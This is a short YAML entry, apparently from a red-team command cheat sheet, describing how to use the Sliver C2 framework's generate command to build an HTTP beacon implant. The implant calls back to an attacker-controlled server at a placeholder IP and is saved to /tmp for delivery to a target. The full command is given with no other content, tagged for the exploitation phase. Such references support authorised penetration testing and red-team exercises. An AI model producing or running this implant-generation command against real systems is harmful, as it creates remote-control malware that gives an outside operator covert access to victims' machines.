---
description: |
  Sliver is an open-source, cross-platform C2 framework designed as a red-team alternative to Cobalt Strike. The generate command compiles a standalone implant (beacon or session) configured to call back to the operator's C2 server. The command below builds an HTTP beacon that will callback to the attacker-controlled Sliver server and saves the compiled binary to disk, ready to be delivered to the target via any initial-access vector.

  Command Reference:

  	Attacker IP: 10.10.10.5

  	Output Directory: /tmp/

command: |
  sliver > generate --http 10.10.10.5 --save /tmp/
items:
  - No_Creds
OS:
  - Linux
  - Windows
phases:
  - Exploitation
references:
  - https://sliver.sh/docs?name=Generating+Slivers
  - https://github.com/BishopFox/sliver
---
